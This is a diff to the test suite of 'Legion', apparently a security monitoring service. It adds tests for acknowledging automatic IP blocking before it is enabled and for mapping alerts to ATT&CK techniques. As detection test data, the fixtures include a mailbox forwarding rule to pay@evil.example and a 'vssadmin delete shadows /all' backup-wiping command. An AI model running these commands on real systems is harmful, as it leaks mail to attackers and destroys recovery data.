@@ -29,6 +29,7 @@ import { isPublicAddress, parseAllowlist, AUTO_PER_HOUR } from "../src/blocklist
 import { manipulationSignals } from "../src/ai-safety.js";
 import { parentTechniques } from "../src/campaigns.js";
 import type { User } from "../src/types.js";
+import { THREAT_SIGNS } from "@legion/agent-identity";
 import { issueCredential, sendSigned, type TestCredential } from "./helpers/webhook.js";
 
 let tenantA: string, tenantB: string;
@@ -193,7 +194,7 @@ describe("automatic blocking", () => {
 
   it("is OFF by default: the campaign is reported, nothing is blocked", async () => {
     expect((await request(app).get("/security/auto-response").set("Authorization", bearer(analystA)).expect(200)).body)
-      .toEqual({ mode: "off", minutes: 60, allowlist: "" });
+      .toEqual({ mode: "off", minutes: 60, allowlist: "", acknowledged: false });
     await attack();
     expect(await campaigns(tenantA)).toHaveLength(1);
     expect(await activeBlocks(tenantA)).toHaveLength(0);
@@ -201,7 +202,7 @@ describe("automatic blocking", () => {
   });
 
   it("when ON, blocks the attacking public address for the set time, audited, and the manager gets it", async () => {
-    await setAuto({ mode: "auto", minutes: 30 }).expect(200);
+    await setAuto({ acknowledge: true, mode: "auto", minutes: 30 }).expect(200);
     await attack();
     const [b] = await activeBlocks(tenantA);
     expect(b).toMatchObject({ ip: ATTACKER, created_by: null });
@@ -218,7 +219,7 @@ describe("automatic blocking", () => {
   });
 
   it("never blocks a private address, an allowlisted one, or for a swarm (the subject is your host)", async () => {
-    await setAuto({ mode: "auto", allowlist: `${OTHER}, 185.0.0.0/16` }).expect(200);
+    await setAuto({ acknowledge: true, mode: "auto", allowlist: `${OTHER}, 185.0.0.0/16` }).expect(200);
     await attack("10.20.30.40");
     await attack(OTHER);
     await attack("185.0.4.4");
@@ -228,7 +229,7 @@ describe("automatic blocking", () => {
   });
 
   it("stops after its hourly limit, so a flood of fake campaigns cannot block the internet", async () => {
-    await setAuto({ mode: "auto" }).expect(200);
+    await setAuto({ acknowledge: true, mode: "auto" }).expect(200);
     for (let i = 0; i < AUTO_PER_HOUR; i++) {
       await query("INSERT INTO ip_blocks (tenant_id, id, ip, reason, expires_at) VALUES ($1, $2, $3, 'earlier', now() + interval '1 hour')",
         [tenantA, randomUUID(), `77.88.${Math.floor(i / 250)}.${(i % 250) + 1}`]);
@@ -356,6 +357,16 @@ describe("the seven most dangerous attack types, as they reach Legion", () => {
     expect(await correlationAlerts(tenantA)).toHaveLength(1);
   });
 
+  it("F-11: the alert names the ATT&CK techniques the matched signs prove (forwarding rule T1114, MFA removed T1556)", async () => {
+    await send(credA, hostEvent("o365", 'Office 365: New-InboxRule -Name x -ForwardTo pay@evil.example "UserId": "dana@acme.example"'));
+    const [a] = await correlationAlerts(tenantA);
+    expect(a.mitre_technique).toContain("T1114");
+    const [c] = await campaigns(tenantA);
+    expect(c.techniques).toContain("T1114");
+    await send(credA, hostEvent("o365", 'Azure AD: MFA method removed "UserId": "dana@acme.example"'));
+    expect((await campaigns(tenantA))[0].techniques).toEqual(expect.arrayContaining(["T1114", "T1556"]));
+  });
+
   it("a real Microsoft 365 audit event (no full_log, details in data) is recognised as a mailbox takeover", async () => {
     await send(credA, { provider: "wazuh", event: {
       id: `o365-${randomUUID()}`, rule: { description: "Office 365: Exchange admin activity", level: 5, groups: ["office365"] }, agent: { name: "wazuh-manager" },
@@ -426,7 +437,7 @@ describe("the seven most dangerous attack types, as they reach Legion", () => {
   });
 
   it("automatic blocking never acts on these: they are about hosts and accounts, not one attacking address", async () => {
-    await setAuto({ mode: "auto" }).expect(200);
+    await setAuto({ acknowledge: true, mode: "auto" }).expect(200);
     await send(credA, event({ ip: ATTACKER, host: "fs-03", mitre: [], log: "vssadmin.exe delete shadows /all" }));
     expect((await campaigns(tenantA)).map((c) => c.rule)).toEqual(["ransomware"]);
     expect(await activeBlocks(tenantA)).toEqual([]);
@@ -442,6 +453,9 @@ describe("the seven most dangerous attack types, as they reach Legion", () => {
     await query("ALTER TABLE attack_campaigns DROP CONSTRAINT IF EXISTS attack_campaigns_rule_check");
     await query("ALTER TABLE attack_campaigns ADD CONSTRAINT attack_campaigns_rule_check CHECK (rule IN ('rapid_chain','wide_sweep','swarm','velocity','ai_manipulation'))");
     await expect(query("INSERT INTO attack_campaigns (tenant_id, id, rule, subject) VALUES ($1, 'CMP-OLD', 'ransomware', 'x')", [tenantA])).rejects.toThrow();
+    // An older installation's schema was built from older schema files: its
+    // recorded fingerprint differs from the current one (migrations.test.ts).
+    await query("UPDATE legion_schema_state SET fingerprint = 'from-an-older-release' WHERE id = 1");
     await migrate();
     await query("INSERT INTO attack_campaigns (tenant_id, id, rule, subject) VALUES ($1, 'CMP-NEW', 'ransomware', 'x')", [tenantA]);
     await expect(query("INSERT INTO attack_campaigns (tenant_id, id, rule, subject) VALUES ($1, 'CMP-BAD', 'made_up', 'x')", [tenantA])).rejects.toThrow();
@@ -526,7 +540,7 @@ describe("stopping unauthorized access", () => {
   });
 
   it("with automatic response on, both are STOPPED: the attacking address is blocked and the manager is told", async () => {
-    await setAuto({ mode: "auto" }).expect(200);
+    await setAuto({ acknowledge: true, mode: "auto" }).expect(200);
     for (let i = 0; i < 3; i++) await send(credA, login(false, "dana"));
     await send(credA, login(true, "dana"));
     const blocks = await activeBlocks(tenantA);
@@ -537,7 +551,7 @@ describe("stopping unauthorized access", () => {
   });
 
   it("the same account broken into again from ANOTHER address: that address is blocked too (the campaign already exists)", async () => {
-    await setAuto({ mode: "auto" }).expect(200);
+    await setAuto({ acknowledge: true, mode: "auto" }).expect(200);
     for (let i = 0; i < 3; i++) await send(credA, login(false, "dana"));
     await send(credA, login(true, "dana"));
     for (let i = 0; i < 3; i++) await send(credA, login(false, "dana", OTHER));
@@ -560,9 +574,51 @@ describe("stopping unauthorized access", () => {
   });
 
   it("from a private address it is reported, never blocked (it could be your own office)", async () => {
-    await setAuto({ mode: "auto" }).expect(200);
+    await setAuto({ acknowledge: true, mode: "auto" }).expect(200);
     for (let i = 0; i < 10; i++) await send(credA, login(false, "root", "10.0.0.7"));
     expect(await rulesOf()).toEqual(["credential_attack"]);
     expect(await activeBlocks(tenantA)).toEqual([]);
+  });
+});
+
+describe("written acknowledgement before automatic blocking", () => {
+  it("refuses auto mode until the notice is acknowledged, records it once, and re-asks on a new notice version", async () => {
+    const plain = () => request(app).patch("/security/auto-response").set("Authorization", bearer(adminA));
+    const refused = await plain().send({ mode: "auto" });
+    expect(refused.status).toBe(400);
+    expect(refused.body.code).toBe("acknowledgement_required");
+    expect((await plain().send({ mode: "off" })).status).toBe(200);
+
+    await plain().send({ mode: "auto", acknowledge: true }).expect(200);
+    const row = (await query("SELECT auto_block_ack_by, auto_block_ack_version, auto_block_ack_at FROM tenants WHERE id = $1", [tenantA])).rows[0] as Record<string, unknown>;
+    expect(row.auto_block_ack_by).toBeTruthy();
+    expect(row.auto_block_ack_version).toBe("1");
+    expect(row.auto_block_ack_at).toBeTruthy();
+    expect(Number((await query("SELECT count(*) AS n FROM audit_log WHERE tenant_id = $1 AND action = 'security.auto_block_acknowledged'", [tenantA])).rows[0]!.n)).toBe(1);
+
+    await plain().send({ mode: "off" }).expect(200);
+    await plain().send({ mode: "auto" }).expect(200);           // no second prompt
+
+    await query("UPDATE tenants SET auto_block_ack_version = '0' WHERE id = $1", [tenantA]);
+    await plain().send({ mode: "off" }).expect(200);
+    expect((await plain().send({ mode: "auto" })).status).toBe(400);   // the notice changed
+  });
+});
+
+describe("F-11: ATT&CK mapping of Legion's own signs", () => {
+  // Strong signs that deliberately name no technique: the text does not prove one.
+  const WITHOUT_TECHNIQUE: Record<string, string> = {
+    integrity_failure: "a failed signature or checksum may be corruption or a bad mirror, not an attack technique",
+  };
+  it("every strong sign names a valid ATT&CK technique id, or is a reviewed exception", () => {
+    for (const sign of THREAT_SIGNS.filter((x) => x.strong)) {
+      if (WITHOUT_TECHNIQUE[sign.id]) { expect(sign.technique).toBeUndefined(); continue; }
+      expect(sign.technique, sign.id).toMatch(/^T\d{4}$/);
+    }
+  });
+  it("weak signs that are too generic name none", () => {
+    for (const id of ["file_change", "overload", "persistence", "software_install"]) {
+      expect(THREAT_SIGNS.find((x) => x.id === id)?.technique, id).toBeUndefined();
+    }
   });
 });
